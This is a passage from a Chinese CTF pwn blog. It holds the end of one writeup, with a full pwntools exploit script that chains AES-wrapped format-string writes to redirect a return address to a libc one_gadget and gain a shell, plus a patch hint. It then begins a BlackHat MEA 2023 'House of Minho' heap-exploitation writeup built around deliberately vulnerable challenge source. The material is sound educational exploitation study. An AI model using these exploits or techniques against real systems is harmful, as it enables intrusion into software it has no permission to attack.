<p>在此之后就是常规的攻击了。我选择将栈上的返回地址劫持为 libc 中的 one_gadget。</p>

<h3 id="exploit-script-1">Exploit Script</h3>

<p>我使用 <code class="language-plaintext highlighter-rouge">Cryptodomex</code> 库进行 AES 加密。如果有安装 <code class="language-plaintext highlighter-rouge">Cryptodome</code> 库，也可以直接将脚本中所有 <code class="language-plaintext highlighter-rouge">Cryptodome</code> 直接替换为 <code class="language-plaintext highlighter-rouge">Crypto</code>。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Cryptodome.Util.Padding</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>

<span class="c1"># ---------------- Environment Config ---------------- #
</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>

<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>

<span class="c1"># ------------------- Exploitation ------------------- #
</span>
<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span>       <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x7b</span><span class="p">,</span><span class="mh">0xf3</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x9c</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x1d</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x7b</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x34</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">aes128_encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">aes128_decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">:]),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>

    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'name'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'******'</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'3 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">'.%6$p.%15$p.</span><span class="se">\0</span><span class="s">'</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)</span>
    <span class="n">stack_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"stack_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_base</span><span class="p">))</span>
    <span class="n">i_addr</span> <span class="o">=</span> <span class="n">stack_base</span><span class="o">-</span><span class="mh">0x124</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"i: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">i_addr</span><span class="p">))</span>
    <span class="n">return_addr</span> <span class="o">=</span> <span class="n">i_addr</span><span class="o">+</span><span class="mh">0x34</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"return_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">return_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'.'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x24083</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'2 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">i_addr</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%6$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'1 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%5c%45$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>

    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xe3b01</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] write </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="si">}</span><span class="s"> to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">return_addr</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'4 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">return_addr</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%6$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'3 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">one_gadget</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%45$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] write </span><span class="si">{</span><span class="nb">hex</span><span class="p">((</span><span class="n">one_gadget</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="si">}</span><span class="s"> to </span><span class="si">{</span><span class="nb">hex</span><span class="p">((</span><span class="n">return_addr</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'2 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="p">(</span><span class="n">return_addr</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%6$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'1 times'</span><span class="p">,</span> <span class="n">aes128_encrypt</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="p">(</span><span class="n">one_gadget</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%45$hn</span><span class="se">\0</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">key</span><span class="p">))</span>

    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'too!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="c1"># ------------------ Infrastructure ------------------ #
</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s">"""
        # set debug-file-directory ~/gaio/libs/2.29-0ubuntu2_amd64/.debug/
        b *$rebase(0x1600)
        b *$rebase(0x15cb)
    """</span><span class="p">)</span>
    <span class="c1"># pause()
</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">debug</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for debug"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

    <span class="n">pwn</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="patch-1">Patch</h3>

<p>最简单的方式是直接把 <code class="language-plaintext highlighter-rouge">printf</code> 直接改成 <code class="language-plaintext highlighter-rouge">puts</code> 。</p>

<p>我们比赛时 patch 的方法是跳转到 <code class="language-plaintext highlighter-rouge">.eh_frame</code> 段的代码中，执行 <code class="language-plaintext highlighter-rouge">printf("%s", buf)</code>。</p>]]></content><author><name></name></author><category term="pwn" /><summary type="html"><![CDATA[国赛决赛PWN赛后复现：]]></summary></entry><entry><title type="html">BlackHatMEA 2023 House of Minho</title><link href="https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html" rel="alternate" type="text/html" title="BlackHatMEA 2023 House of Minho" /><published>2024-04-18T21:22:03+08:00</published><updated>2024-04-18T21:22:03+08:00</updated><id>https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho</id><content type="html" xml:base="https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html"><![CDATA[<p>参考以及题目附件见：<a href="https://bbs.kanxue.com/thread-279588.htm">Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome</a>
本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。</p>

<h2 id="程序概况">程序概况</h2>

<p>容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_amd64 进行调试）
保护情况：全部开启</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/cameudis/ctf/practice/houseofminho/pwn'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre></div></div>

<p>附件里提供了程序源码：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define SIZE_SMALL 0x40
#define SIZE_BIG   0x80
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">g_buf</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"1. new</span><span class="se">\n</span><span class="s">2. show</span><span class="se">\n</span><span class="s">3. delete"</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">getint</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* new */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Buffer in use"</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">getint</span><span class="p">(</span><span class="s">"Size [1=small / 2=big]: "</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">g_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">SIZE_SMALL</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="n">g_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">SIZE_BIG</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">,</span> <span class="n">SIZE_BIG</span><span class="p">);</span>  <span class="c1">// overflow</span>
        <span class="n">g_buf</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">g_buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* show */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Empty buffer"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* delete */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Empty buffer"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="n">free</span><span class="p">(</span><span class="n">g_buf</span><span class="p">);</span>
          <span class="n">g_buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="nl">default:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Bye!"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>漏洞点：不难发现，在 new 功能中，不管我们选择 small 还是 big，最后都能读入 SIZE_BIG 字节，存在 0x40 字节的堆溢出。</p>

<p>但是除了漏洞以外，我们的能力非常少：只能分配 0x40 或者 0x80 大小的堆块，只能同时使用一个堆块，只能在申请出来的时候 edit。</p>

<h2 id="攻击思路概括">攻击思路概括</h2>

<p>首先可以想到，对该大小的堆块可以进行 tcache 相关的攻击，比如 tcache poisoning -&gt; House of Apple2。</p>

<p>为了实施 tcache poisoning，在高版本的 GLIBC 中有一个限制就是还要考虑到对应 bin 的 count。在本题中，我们没办法同时申请到两个堆块，因此无法通过 <code class="language-plaintext highlighter-rouge">free()</code> 来往某个 bin 中放入两个 chunk。</p>

<p>值得注意的是，不只是 <code class="language-plaintext highlighter-rouge">free()</code> 函数会将堆块放入 tcache。在 <code class="language-plaintext highlighter-rouge">malloc()</code> 从 smallbin 取堆块的过程中，如果 smallbin 中取出一个堆块后仍有剩余，并且相应的 tcache 未满，则会触发一个循环，将剩余的 smallbin 中的堆块转移到 tcache 中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
      <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">);</span>
          <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
          <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
        <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
          <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="cp">#if USE_TCACHE
</span>      <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
             <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="p">{</span>
              <span class="n">bck</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
            <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">);</span>
              <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
              <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span> 
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="p">}</span>
<span class="cp">#endif
</span>          <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
          <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>我们可以尝试利用这个过程，往 tcache 填入更多的区块。</p>

<blockquote>
  <p>其实看源码可以发现，在取出 smallbin 区块放到 tcache 的过程中，代码并没有做任何检查。也就是说，如果能够 UAF 或溢出修改一个 smallbin 中的 bk 指针，就可以伪造一条 smallbin 链表，往 tcache 中填入任意地址。这个技巧之后也会用到。</p>
</blockquote>

<p>但是这又遇到了问题：怎么往 smallbin 里面放入至少两个堆块？我们至少要使 bk 链表存在 2+个堆块，才能使某些堆块进入 tcache。</p>

<p>好吧，让我们先把问题简化成：怎么往 smallbin 里面放入一个堆块？<code class="language-plaintext highlighter-rouge">malloc()</code> 会在 unsorted bin 大循环中迭代每一个其中的堆块，并把他们放到对应大小的 bin 中。所以想在 smallbin 中放一个堆块，得首先使一个 smallbin 大小的堆块被放到 unsorted bin 之中。</p>

<p>考虑到 small bin 大小都属于 tcache 大小，这个步骤很难完成。但注意到堆溢出可以帮助简化这个流程：先把一个很大的堆块放到 unsorted bin 中，再溢出把它的大小改小即可。</p>

<p>如何把一个很大的堆块放到 unsorted bin 中？其实这个很好办，在本题中我们会用到两个受限情况下很好用的 trick：</p>

<ol>
  <li>
    <p>溢出修改 Top Chunk 的 size 域，将 0x??XYZ 覆盖为 0xXYZ 后，再申请一个很大的堆块，就可以将 Top Chunk 回收到 unsorted bin 中。（这个技巧来自 house of orange）</p>
  </li>
  <li>
    <p>如果程序没有使用 <code class="language-plaintext highlighter-rouge">setbuf(stdin, 0)</code> 关闭标准输入流的缓冲功能，那么在程序使用 <code class="language-plaintext highlighter-rouge">scanf()</code> 读取很长的数据时，会使用 malloc 和 realloc 分配临时的缓冲区，并在使用完毕后使用 <code class="language-plaintext highlighter-rouge">free()</code> 将其释放。举例：如果 scanf 读入数据长度为 0x1000，那么会产生如下调用：</p>
  </li>
</ol>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x800</span><span class="p">);</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
